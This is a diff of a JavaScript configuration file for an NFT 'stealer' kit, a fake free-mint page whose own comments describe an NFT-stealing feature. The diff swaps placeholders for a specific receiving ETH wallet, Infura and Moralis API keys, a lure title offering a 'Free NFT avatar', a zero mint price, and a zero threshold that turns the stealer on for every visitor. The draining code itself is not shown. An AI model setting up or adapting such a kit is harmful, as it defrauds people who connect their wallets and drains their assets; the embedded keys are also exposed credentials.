@@ -1,15 +1,15 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "YOUR WALLET";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x7d8Ac1a2806f8670fB0c643Dc732488d3cDC6dC4";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "2FFiPoVHXGAzJCUIDjNOCRlaTil"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "blfbdF3Z7jfXbaELdul2mWym15xtBV1QSu8KTIUuaLs4qYtF5uqUyNgkIsx4R2gy"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
-    name: "Tec.sellix.io",
-    title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "XX.XX.XXXX", // Today date
+    name: "NFA",
+    title: "Free NFT avatar for all metaverse", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
+    date: "25.09.2022", // Today date
     socialMedia: {
-        discord: "https://discord.gg/example",
-        twitter: "https://twitter.com/example",
+        discord: "https://discord.gg/NFA",
+        twitter: "https://twitter.com/NFA",
     },
     medias: {
         preview: "preview.gif",
@@ -23,7 +23,7 @@ const collectionInfo = {
     }
 }
 const mintInfo = {
-    price: 0.2,         // Price per NFT.
+    price: 0.0,         // Price per NFT.
     totalSupply: 999,   // Total supply of NFTs.
     minUnits: 1,        // Min units to buy.
     maxUnits: 6,        // Max units to buy.
@@ -32,7 +32,7 @@ const mintInfo = {
 
 const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
-    minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
+    minValue: 0.0,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
     receiveAddress: "" // leave empty if you want to use the same address 
 }
